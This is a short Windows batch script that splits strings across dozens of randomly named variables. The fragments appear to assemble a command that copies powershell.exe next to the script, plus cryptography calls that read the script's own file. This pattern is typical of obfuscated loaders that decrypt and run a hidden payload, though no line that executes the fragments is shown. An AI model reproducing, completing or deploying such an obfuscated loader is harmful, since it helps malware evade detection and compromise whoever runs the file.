@echo off
set "himvuuzQMS=em"
set "QEGEmtEZPm=we"
set "lqJyvqqnal=ll"
set "IiAKCjmlEe=in"
set "xXxxQTQXdu=\W"
set "OslrFkLOEB=ws"
set "BBBFrUKHbT=32"
set "qjTgmzJHWb= C"
set "eVqQsvuSGp=0\"
set "uSLKJiRZwo=1."
set "VGYUWyzkIA=xe"
set "MerbFpXjfs=rS"
set "PHNitBhkaW=Wi"
set "tqHAXqtYYF=ow"
set "QvctQISwMt=.e"
set "auaxHzQCpI=py"
set "esfwVLKSoh=he"
set "DcJIZnhMGc=do"
set "bkLvyzoMEZ=ll"
set "HycXqunOxD=we"
set "DvQFBXmpqJ=nd"
set "WWraPzkLLU=\v"
set "szGZydTwAB=Sy"
set "yyHdAbpsyH=he"
set "MUWJCJpLFn=y "
set "ZJiTvBgGob=po"
set "zqRMgbGAIt=rs"
set "DCMrjsbQch=Po"
set "JMKIkoFwoH= /"
set "CiVaTIvLNK=s\"
set "hgvCicYDCw=co"
set "yJbcybXIGp=:\"
set "OIsXWyankc=st"
set "zIvVwUXuyo=cd"
set "yTyYlRVUmn= %~dp0"
set "PFsbsviEjl=]::C"
set "rgFFxeoJud= [Sy"
set "wdNgKobWDW=[Sys"
set "NegAwUsECv=Et.D"
set "HhmRRdZJUl=ypto"
set "gTCzGuulVg=('%~f0'"
set "NRTdoosOUj=tem."
set "mbKVROsMwP=.Com"
set "hnWtQQCPDk=yste"
set "iapclANTWC=gth)"
set "iUAFIygvpR=);$u"
